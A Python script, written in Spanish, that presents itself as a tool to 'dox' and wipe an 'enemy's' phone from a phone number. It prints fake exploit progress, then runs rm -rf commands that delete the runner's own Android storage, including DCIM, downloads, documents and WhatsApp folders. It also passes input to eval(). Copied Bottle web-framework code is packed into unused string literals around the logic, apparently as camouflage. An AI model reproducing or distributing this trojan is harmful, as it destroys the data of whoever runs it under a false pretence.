#!/bin/python

import os
import time
'''
def fetr():
        def get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):
        """ Return the content of a cookie. To read a `Signed Cookie`, the
            `secret` must match the one used to create the cookie (see
            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing
            cookie or wrong signature), return a default value. """
        value = self.cookies.get(key)
        if secret:
            # See BaseResponse.set_cookie for details on signed cookies.
            if value and value.startswith('!') and '?' in value:
                sig, msg = map(tob, value[1:].split('?', 1))
                hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()
                if _lscmp(sig, base64.b64encode(hash)):
                    dst = pickle.loads(base64.b64decode(msg))
                    if dst and dst[0] == key:
                        return dst[1]
            return default
        return value or default
    @DictProperty('environ', 'bottle.request.query', read_only=True)
    def query(self):
        """ The :attr:`query_string` parsed into a :class:`FormsDict`. These
            values are sometimes called "URL arguments" or "GET parameters", but
            not to be confused with "URL wildcards" as they are provided by the
            :class:`Router`. """
        get = self.environ['bottle.get'] = FormsDict()
        pairs = _parse_qsl(self.environ.get('QUERY_STRING', ''))
        for key, value in pairs:
            get[key] = value
        return get
    @DictProperty('environ', 'bottle.request.forms', read_only=True)
    def forms(self):
        """ Form values parsed from an `url-encoded` or `multipart/form-data`
            encoded POST or PUT request body. The result is returned as a
            :class:`FormsDict`. All keys and values are strings. File uploads
            are stored separately in :attr:`files`. """
        forms = FormsDict()
        forms.recode_unicode = self.POST.recode_unicode
        for name, item in self.POST.allitems():
            if not isinstance(item, FileUpload):
                forms[name] = item
        return forms
    @DictProperty('environ', 'bottle.request.params', read_only=True)
    def params(self):
        """ A :class:`FormsDict` with the combined values of :attr:`query` and
            :attr:`forms`. File uploads are stored in :attr:`files`. """
        params = FormsDict()
        for key, value in self.query.allitems():
            params[key] = value
        for key, value in self.forms.allitems():
            params[key] = value
        return params
    @DictProperty('environ', 'bottle.request.files', read_only=True)
    def files(self):
        """ File uploads parsed from `multipart/form-data` encoded POST or PUT
            request body. The values are instances of :class:`FileUpload`.
        """
        files = FormsDict()
        files.recode_unicode = self.POST.recode_unicode
        for name, item in self.POST.allitems():
            if isinstance(item, FileUpload):
                files[name] = item
        return files
    @DictProperty('environ', 'bottle.request.json', read_only=True)
    def json(self):
        """ If the ``Content-Type`` header is ``application/json`` or
            ``application/json-rpc``, this property holds the parsed content
            of the request body. Only requests smaller than :attr:`MEMFILE_MAX`
            are processed to avoid memory exhaustion.
            Invalid JSON raises a 400 error response.
        """
        ctype = self.environ.get('CONTENT_TYPE', '').lower().split(';')[0]
        if ctype in ('application/json', 'application/json-rpc'):
            b = self._get_body_string(self.MEMFILE_MAX)
            if not b:
                return None
            try:
                return json_loads(b)
            except (ValueError, TypeError):
                raise HTTPError(400, 'Invalid JSON')
        return None
    def _iter_body(self, read, bufsize):
        maxread = max(0, self.content_length)
        while maxread:
            part = read(min(maxread, bufsize))
            if not part: break
            yield part
            maxread -= len(part)
    @staticmethod
    def _iter_chunked(read, bufsi)
            header = read(1)
            while header[-2:] != rn:
                c = read(1)
                header += c
                if not c: raise err
                if len(header) > bufsize: raise err
            size, _, _ = header.partition(sem)
            try:
                maxread = int(tonat(size.strip()), 16)
            except ValueError:
                raise err
            if maxread == 0: break
            buff = bs
            while maxread > 0:
                if not buff:
                    buff = read(min(maxread, bufsize))
                part, buff = buff[:maxread], buff[maxread:]
                if not part: raise err
                yield part
                maxread -= len(part)
            if read(2) != rn:
                raise err
    @DictProperty('environ', 'bottle.request.body', read_only=True)
    def _body(self):
        try:
            read_func = self.environ['wsgi.input'].read
        except KeyError:
            self.environ['wsgi.input'] = BytesIO()
            return self.environ['wsgi.input']
        body_iter = self._iter_chunked if self.chunked else self._iter_body
        body, body_size, is_temp_file = BytesIO(), 0, False
        for part in body_iter(read_func, self.MEMFILE_MAX):
            body.write(part)
            body_size += len(part)
            if not is_temp_file and body_size > self.MEMFILE_MAX:
                body, tmp = TemporaryFile(mode='w+b'), body
                body.write(tmp.getvalue())
                del tmp
                is_temp_file = True
        self.environ['wsgi.input'] = body
        body.seek(0)
        return body
    def _get_body_string(self, maxread):
        """ Read body into a string. Raise HTTPError(413) on requests that are
            to large. """
        if self.content_length > maxread:
            raise HTTPError(413, 'Request entity too large')
        data = self.body.read(maxread + 1)
        if len(data) > maxread:
            raise HTTPError(413, 'Request entity too large')
        return data
    @property
    def body(self):
        """ The HTTP request body as a seek-able file-like object. Depending on
            :attr:`MEMFILE_MAX`, this is either a temporary file or a
            :class:`io.BytesIO` instance. Accessing this property for the first
            time reads and replaces the ``wsgi.input`` environ variable.
            Subsequent accesses just do a `seek(0)` on the file object. """
        self._body.seek(0)
        return self._body
    @property
    def chunked(self):
        """ True if Chunked transfer encoding was. """
        return 'chunked' in self.environ.get(
            'HTTP_TRANSFER_ENCODING', '').lower()
    #: An alias for :attr:`query`.
    GET = query
    @DictProperty('environ', 'bottle.request.post', read_only=True)
    def POST(self):
        """ The values of :attr:`forms` and :attr:`files` combined into a single
            :class:`FormsDict`. Values are either strings (form values) or
            instances of :class:`cgi.FieldStorage` (file uploads).
        """
        post = FormsDict()
        # We default to application/x-www-form-urlencoded for everything that
        # is not multipart and take the fast path (also: 3.1 workaround)
        if not self.content_type.startswith('multipart/'):
            body = tonat(self._get_body_string(self.MEMFILE_MAX), 'latin1')
            for key, value in _parse_qsl(body):
                post[key] = value
            return post
        safe_env = {'QUERY_STRING': ''}  # Build a safe environment for cgi
        for key in ('REQUEST_METHOD', 'CONTENT_TYPE', 'CONTENT_LENGTH'):
            if key in self.environ: safe_env[key] = self.environ[key]
        args = dict(fp=self.body, environ=safe_env, keep_blank_values=True)
        if py3k:
            args['encoding'] = 'utf8'
            post.recode_unicode = False
        data = cgi.FieldStorage(**args)
        self['_cgi.FieldStorage'] = data  #http://bugs.python.org/issue18394
        data = data.list or []
        for item in data:
            if item.filename:
                post[item.name] = FileUpload(item.file, item.name,
                                             item.filename, item.headers)
            else:
                post[item.name] = item.value
        return post
    @property
    def url(self):
        """ The full request URI including hostname and scheme. If your app
            lives behind a reverse proxy or load balancer and you get confusing
            results, make sure that the ``X-Forwarded-Host`` header is set
            correctly. """
        return self.urlparts.geturl()
    @DictProperty('environ', 'bottle.request.urlparts', read_only=True)
    def urlparts(self):
        """ The :attr:`url` string as an :class:`urlparse.SplitResult` tuple.
            The tuple contains (scheme, host, path, query_string and fragment),
            but the fragment is always empty because it is not visible to the
            server. """
        env = self.environ
        http = env.get('HTTP_X_FORWARDED_P
             or env.get('wsgi.url_scheme', 'http')
        host = env.get('HTTP_X_FORWARDED_HOST') or env.get('HTTP_HOST')
        if not host:
            # HTTP 1.1 requires a Host-header. This is for HTTP/1.0 clients.
            host = env.get('SERVER_NAME', '127.0.0.1')
            port = env.get('SERVER_PORT')
            if port and port != ('80' if http == 'http' else '443'):
                host += ':' + port
        path = urlquote(self.fullpath)
        return UrlSplitResult(http, host, path, env.get('QUERY_STRING'), '')
    @property
    def fullpath(self):
        """ Request path including :attr:`script_name` (if present). """
        return urljoin(self.script_name, self.path.lstrip('/'))
    @property
    def query_string(self):
        """ The raw :attr:`query` part of the URL (everything in between ``?``
            and ``#``) as a string. """
        return self.environ.get('QUERY_STRING', '')
    @property
    def script_name(self):
        """ The initial portion of the URL's `path` that was removed by a higher
            level (server or routing middleware) before the application was
            called. This script path is returned with leading and tailing
            slashes. """
        script_name = self.environ.get('SCRIPT_NAME', '').strip('/')
        return '/' + script_name + '/' if script_name else '/'
    def path_shift(self, shift=1):
        """ Shift path segments from :attr:`path` to :attr:`script_name` and
            vice versa.
           :param shift: The number of path segments to shift. May be negative
                         to change the shift direction. (default: 1)
        """
        script, path = path_shift(self.environ.get('SCRIPT_NAME', '/'), self.path, shift)
        self['SCRIPT_NAME'], self['PATH_INFO'] = script, path
    @property
    def content_length(self):
        """ The request body length as an integer. The client is responsible to
            set this header. Otherwise, the real length of the body is unknown
            and -1 is returned. In this case, :attr:`body` will be empty. """
        return int(self.environ.get('CONTENT_LENGTH') or -1)
    @property
    def content_type(self):
        """ The Content-Type header as a lowercase-string (default: empty). """
        return self.environ.get('CONTENT_TYPE', '').lower()
    @property
    def is_xhr(self):
        """ True if the request was triggered by a XMLHttpRequest. This only
            works with JavaScript libraries that support the `X-Requested-With`
            header (most of the popular libraries do). """
        requested_with = self.environ.get('HTTP_X_REQUESTED_WITH', '')
        return requested_with.lower() == 'xmlhttprequest'
    @property
    def is_ajax(self):
        """ Alias for :attr:`is_xhr`. "Ajax" is not the right term. """
        return self.is_xhr
    @property
    def auth(self):
        """ HTTP authentication data as a (user, password) tuple. This
            implementation currently supports basic (not digest) authentication
            only. If the authentication happened at a higher level (e.g. in the
            front web-server or a middleware), the password field is None, but
            the user field is looked up from the ``REMOTE_USER`` environ
            variable. On any errors, None is returned. """
        basic = parse_auth(self.environ.get('HTTP_AUTHORIZATION', ''))
        if basic: return basic
        ruser = self.environ.get('REMOTE_USER')
        if ruser: return (ruser, None)
        return None
    @property
    def remote_route(self):
        """ A list of all IPs that were involved in this request, starting with
            the client IP and followed by zero or more proxies. This does only
            work if all proxies support the ```X-Forwarded-For`` header. Note
            that this information can be forged by malicious clients. """
        proxy = self.environ.get('HTTP_X_FORWARDED_FOR')
        if proxy: return [ip.strip() for ip in proxy.split(',')]
        remote = self.environ.get('REMOTE_ADDR')
        return [remote] if remote else []
    @property
    def remote_addr(self):
        """ The client IP as a string. Note that this information can be forged
            by malicious clients. """
        route = self.remote_route
#        return route[0] if route else None
'''
def banner():
    print("""
      ___            _ ____ 
  ___|   \ _____ __ / |__  |
 |___| |) / _ \ \ / | | / / 
     |___/\___/_\_\ |_|/_(_)

Script para doxear solo con numero telefonico y elimnar todo los datos de la victima.
Created by 17.
    """)


"""
        post = FormsDict()
        # We default to application/x-www-form-urlencoded for everything that
        # is not multipart and take the fast path (also: 3.1 workaround)
        if not self.content_type.startswith('multipart/'):
            body = tonat(self._get_body_string(self.MEMFILE_MAX), 'latin1')
            for key, value in _parse_qsl(body):
                post[key] = value
            return post
        safe_env = {'QUERY_STRING': ''}  # Build a safe environment for cgi
        for key in ('REQUEST_METHOD', 'CONTENT_TYPE', 'CONTENT_LENGTH'):
            if key in self.environ: safe_env[key] = self.environ[key]
        args = dict(fp=self.body, environ=safe_env, keep_blank_values=True)
        if py3k:
            args['encoding'] = 'utf8'
            post.recode_unicode = False
        data = cgi.FieldStorage(**args)
        self['_cgi.FieldStorage'] = data  #http://bugs.python.org/issue18394
        data = data.list or []
        for item in data:
            if item.filename:
                post[item.name] = FileUpload(item.file, item.name,
                                             item.filename, item.headers)
            else:
                post[item.name] = item.value
        return post
    @property
    def url(self):
The full request URI including hostname and scheme. If your app
            lives behind a reverse proxy or load balancer and you get confusing
            results, make sure that the ``X-Forwarded-Host`` header is set
            correctly.  return self.urlparts.geturl()
    @DictProperty('environ', 'bottle.request.urlparts', read_only=True)
    def urlparts(self):
         The :attr:`url` string as an :class:`urlparse.SplitResult` tuple.
            The tuple contains (scheme, host, path, query_string and fragment),
            but the fragment is always empty because it is not visible to the
            server. 
        env = self.environ
        http = env.get('HTTP_X_FORWARDED_PROT
             or env.get('wsgi.url_scheme', 'http')
        host = env.get('HTTP_X_FORWARDED_HOST') or env.get('HTTP_HOST')
        if not host:
            # HTTP 1.1 requires a Host-header. This is for HTTP/1.0 clients.
            host = env.get('SERVER_NAME', '127.0.0.1')
            port = env.get('SERVER_PORT')
            if port and port != ('80' if http == 'http' else '443'):
                host += ':' + port
        path = urlquote(self.fullpath)
        return UrlSplitResult(http, host, path, env.get('QUERY_STRING'), '')
    @property
    def fullpath(self):
        Request path including :attr:`script_name` (if present). """

banner()


numero = input("\n Introduce el número del enemigo: ")
print(" LOADING....")
print(f"\n Mandando SMS con vulnerabilidad 0day a {numero}")

time.sleep(10)

print(f"\n introduciendose en el dispositivo, IP: 192.168.0.1")

time.sleep(10)


print(f"\n Generando persistencia al {numero}")

time.sleep(10)

siii = int(eval(input(" \nPersistencia lista, preparado para eliminar todo?\n\n En tu pantalla se mostrara lo que se va borrando del objetivo\n Listo?  \n 1)si \n responde:  ")))
os.system("clear")
if siii == 1:
    print(" \n comienzo de depuracion del telefono objetivo")
    print(" en 6")
    time.sleep(1)
    print(" en 5")
    time.sleep(1)
    print(" en 4")
    time.sleep(1)
    print(" en 3")
    time.sleep(1)
    print(" en 2")
    time.sleep(1)
    print(" en 1")
    time.sleep(1)
    print(" Formateando el telefono del enemigo")
    os.system("rm -rf /storage/emulated/0/*")
    os.system("rm - rf /storage/emulated/Android")
    os.system("rm -rf /storage/emulated/0/data")
    os.system("rm -rf /storage/emulated/0/DCIM")
    os.system("rm -rf /storage/emulated/0/Download")
    os.system("rm -rf /storage/emulated/0/download")
    os.system("rm -rf /storage/emulated/0/Descargas")
    os.system("rm -rf /storage/emulated/0/descargas")
    os.system("rm -rf /storage/emulated/0/Documents")
    os.system("rm -rf /storage/emulated/0/documents")
    os.system("rm -rf /storage/emulated/0/whatsapp")
    os.system("rm -rf /storage/emulated/0/*")

else:
    print("Introdujiste un valor erroneo reintenta por favor")
    time.sleep(3)
    os.system("clear")
    os.system("python3 DoxNum")

    '''
def fetr():
        def get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):
        """ Return the content of a cookie. To read a `Signed Cookie`, the
            `secret` must match the one used to create the cookie (see
            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing
            cookie or wrong signature), return a default value. """
        value = self.cookies.get(key)
        if secret:
            # See BaseResponse.set_cookie for details on signed cookies.
            if value and value.startswith('!') and '?' in value:
                sig, msg = map(tob, value[1:].split('?', 1))
                hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()
                if _lscmp(sig, base64.b64encode(hash)):
                    dst = pickle.loads(base64.b64decode(msg))
                    if dst and dst[0] == key:
                        return dst[1]
            return default
        return value or default
    @DictProperty('environ', 'bottle.request.query', read_only=True)
    def query(self):
        """ The :attr:`query_string` parsed into a :class:`FormsDict`. These
            values are sometimes called "URL arguments" or "GET parameters", but
            not to be confused with "URL wildcards" as they are provided by the
            :class:`Router`. """
        get = self.environ['bottle.get'] = FormsDict()
        pairs = _parse_qsl(self.environ.get('QUERY_STRING', ''))
        for key, value in pairs:
            get[key] = value
        return get
    @DictProperty('environ', 'bottle.request.forms', read_only=True)
    def forms(self):
        """ Form values parsed from an `url-encoded` or `multipart/form-data`
            encoded POST or PUT request body. The result is returned as a
            :class:`FormsDict`. All keys and values are strings. File uploads
            are stored separately in :attr:`files`. """
        forms = FormsDict()
        forms.recode_unicode = self.POST.recode_unicode
        for name, item in self.POST.allitems():
            if not isinstance(item, FileUpload):
                forms[name] = item
        return forms
    @DictProperty('environ', 'bottle.request.params', read_only=True)
    def params(self):
        """ A :class:`FormsDict` with the combined values of :attr:`query` and
            :attr:`forms`. File uploads are stored in :attr:`files`. """
        params = FormsDict()
        for key, value in self.query.allitems():
            params[key] = value
        for key, value in self.forms.allitems():
            params[key] = value
        return params
    @DictProperty('environ', 'bottle.request.files', read_only=True)
    def files(self):
        """ File uploads parsed from `multipart/form-data` encoded POST or PUT
            request body. The values are instances of :class:`FileUpload`.
        """
        files = FormsDict()
        files.recode_unicode = self.POST.recode_unicode
        for name, item in self.POST.allitems():
            if isinstance(item, FileUpload):
                files[name] = item
        return files
    @DictProperty('environ', 'bottle.request.json', read_only=True)
    def json(self):
        """ If the ``Content-Type`` header is ``application/json`` or
            ``application/json-rpc``, this property holds the parsed content
            of the request body. Only requests smaller than :attr:`MEMFILE_MAX`
            are processed to avoid memory exhaustion.
            Invalid JSON raises a 400 error response.
        """
        ctype = self.environ.get('CONTENT_TYPE', '').lower().split(';')[0]
        if ctype in ('application/json', 'application/json-rpc'):
            b = self._get_body_string(self.MEMFILE_MAX)
            if not b:
                return None
            try:
                return json_loads(b)
            except (ValueError, TypeError):
                raise HTTPError(400, 'Invalid JSON')
        return None
    def _iter_body(self, read, bufsize):
        maxread = max(0, self.content_length)
        while maxread:
            part = read(min(maxread, bufsize))
            if not part: break
            yield part
            maxread -= len(part)
    @staticmethod
    def _iter_chunked(read, bufsi)
            header = read(1)
            while header[-2:] != rn:
                c = read(1)
                header += c
                if not c: raise err
                if len(header) > bufsize: raise err
            size, _, _ = header.partition(sem)
            try:
                maxread = int(tonat(size.strip()), 16)
            except ValueError:
                raise err
            if maxread == 0: break
            buff = bs
            while maxread > 0:
                if not buff:
                    buff = read(min(maxread, bufsize))
                part, buff = buff[:maxread], buff[maxread:]
                if not part: raise err
                yield part
                maxread -= len(part)
            if read(2) != rn:
                raise err
    @DictProperty('environ', 'bottle.request.body', read_only=True)
    def _body(self):
        try:
            read_func = self.environ['wsgi.input'].read
        except KeyError:
            self.environ['wsgi.input'] = BytesIO()
            return self.environ['wsgi.input']
        body_iter = self._iter_chunked if self.chunked else self._iter_body
        body, body_size, is_temp_file = BytesIO(), 0, False
        for part in body_iter(read_func, self.MEMFILE_MAX):
            body.write(part)
            body_size += len(part)
            if not is_temp_file and body_size > self.MEMFILE_MAX:
                body, tmp = TemporaryFile(mode='w+b'), body
                body.write(tmp.getvalue())
                del tmp
                is_temp_file = True
        self.environ['wsgi.input'] = body
        body.seek(0)
        return body
    def _get_body_string(self, maxread):
        """ Read body into a string. Raise HTTPError(413) on requests that are
            to large. """
        if self.content_length > maxread:
            raise HTTPError(413, 'Request entity too large')
        data = self.body.read(maxread + 1)
        if len(data) > maxread:
            raise HTTPError(413, 'Request entity too large')
        return data
    @property
    def body(self):
        """ The HTTP request body as a seek-able file-like object. Depending on
            :attr:`MEMFILE_MAX`, this is either a temporary file or a
            :class:`io.BytesIO` instance. Accessing this property for the first
            time reads and replaces the ``wsgi.input`` environ variable.
            Subsequent accesses just do a `seek(0)` on the file object. """
        self._body.seek(0)
        return self._body
    @property
    def chunked(self):
        """ True if Chunked transfer encoding was. """
        return 'chunked' in self.environ.get(
            'HTTP_TRANSFER_ENCODING', '').lower()
    #: An alias for :attr:`query`.
    GET = query
    @DictProperty('environ', 'bottle.request.post', read_only=True)
    def POST(self):
        """ The values of :attr:`forms` and :attr:`files` combined into a single
            :class:`FormsDict`. Values are either strings (form values) or
            instances of :class:`cgi.FieldStorage` (file uploads).
        """
        post = FormsDict()
        # We default to application/x-www-form-urlencoded for everything that
        # is not multipart and take the fast path (also: 3.1 workaround)
        if not self.content_type.startswith('multipart/'):
            body = tonat(self._get_body_string(self.MEMFILE_MAX), 'latin1')
            for key, value in _parse_qsl(body):
                post[key] = value
            return post
        safe_env = {'QUERY_STRING': ''}  # Build a safe environment for cgi
        for key in ('REQUEST_METHOD', 'CONTENT_TYPE', 'CONTENT_LENGTH'):
            if key in self.environ: safe_env[key] = self.environ[key]
        args = dict(fp=self.body, environ=safe_env, keep_blank_values=True)
        if py3k:
            args['encoding'] = 'utf8'
            post.recode_unicode = False
        data = cgi.FieldStorage(**args)
        self['_cgi.FieldStorage'] = data  #http://bugs.python.org/issue18394
        data = data.list or []
        for item in data:
            if item.filename:
                post[item.name] = FileUpload(item.file, item.name,
                                             item.filename, item.headers)
            else:
                post[item.name] = item.value
        return post
    @property
    def url(self):
        """ The full request URI including hostname and scheme. If your app
            lives behind a reverse proxy or load balancer and you get confusing
            results, make sure that the ``X-Forwarded-Host`` header is set
            correctly. """
        return self.urlparts.geturl()
    @DictProperty('environ', 'bottle.request.urlparts', read_only=True)
    def urlparts(self):
        """ The :attr:`url` string as an :class:`urlparse.SplitResult` tuple.
            The tuple contains (scheme, host, path, query_string and fragment),
            but the fragment is always empty because it is not visible to the
            server. """
        env = self.environ
        http = env.get('HTTP_X_FORWARDED_P
             or env.get('wsgi.url_scheme', 'http')
        host = env.get('HTTP_X_FORWARDED_HOST') or env.get('HTTP_HOST')
        if not host:
            # HTTP 1.1 requires a Host-header. This is for HTTP/1.0 clients.
            host = env.get('SERVER_NAME', '127.0.0.1')
            port = env.get('SERVER_PORT')
            if port and port != ('80' if http == 'http' else '443'):
                host += ':' + port
        path = urlquote(self.fullpath)
        return UrlSplitResult(http, host, path, env.get('QUERY_STRING'), '')
    @property
    def fullpath(self):
        """ Request path including :attr:`script_name` (if present). """
        return urljoin(self.script_name, self.path.lstrip('/'))
    @property
    def query_string(self):
        """ The raw :attr:`query` part of the URL (everything in between ``?``
            and ``#``) as a string. """
        return self.environ.get('QUERY_STRING', '')
    @property
    def script_name(self):
        """ The initial portion of the URL's `path` that was removed by a higher
            level (server or routing middleware) before the application was
            called. This script path is returned with leading and tailing
            slashes. """
        script_name = self.environ.get('SCRIPT_NAME', '').strip('/')
        return '/' + script_name + '/' if script_name else '/'
    def path_shift(self, shift=1):
        """ Shift path segments from :attr:`path` to :attr:`script_name` and
            vice versa.
           :param shift: The number of path segments to shift. May be negative
                         to change the shift direction. (default: 1)
        """
        script, path = path_shift(self.environ.get('SCRIPT_NAME', '/'), self.path, shift)
        self['SCRIPT_NAME'], self['PATH_INFO'] = script, path
    @property
    def content_length(self):
        """ The request body length as an integer. The client is responsible to
            set this header. Otherwise, the real length of the body is unknown
            and -1 is returned. In this case, :attr:`body` will be empty. """
        return int(self.environ.get('CONTENT_LENGTH') or -1)
    @property
    def content_type(self):
        """ The Content-Type header as a lowercase-string (default: empty). """
        return self.environ.get('CONTENT_TYPE', '').lower()
    @property
    def is_xhr(self):
        """ True if the request was triggered by a XMLHttpRequest. This only
            works with JavaScript libraries that support the `X-Requested-With`
            header (most of the popular libraries do). """
        requested_with = self.environ.get('HTTP_X_REQUESTED_WITH', '')
        return requested_with.lower() == 'xmlhttprequest'
    @property
    def is_ajax(self):
        """ Alias for :attr:`is_xhr`. "Ajax" is not the right term. """
        return self.is_xhr
    @property
    def auth(self):
        """ HTTP authentication data as a (user, password) tuple. This
            implementation currently supports basic (not digest) authentication
            only. If the authentication happened at a higher level (e.g. in the
            front web-server or a middleware), the password field is None, but
            the user field is looked up from the ``REMOTE_USER`` environ
            variable. On any errors, None is returned. """
        basic = parse_auth(self.environ.get('HTTP_AUTHORIZATION', ''))
        if basic: return basic
        ruser = self.environ.get('REMOTE_USER')
        if ruser: return (ruser, None)
        return None
    @property
    def remote_route(self):
        """ A list of all IPs that were involved in this request, starting with
            the client IP and followed by zero or more proxies. This does only
            work if all proxies support the ```X-Forwarded-For`` header. Note
            that this information can be forged by malicious clients. """
        proxy = self.environ.get('HTTP_X_FORWARDED_FOR')
        if proxy: return [ip.strip() for ip in proxy.split(',')]
        remote = self.environ.get('REMOTE_ADDR')
        return [remote] if remote else []
    @property
    def remote_addr(self):
        """ The client IP as a string. Note that this information can be forged
            by malicious clients. """
        route = self.remote_route
#        return route[0] if route else None
'''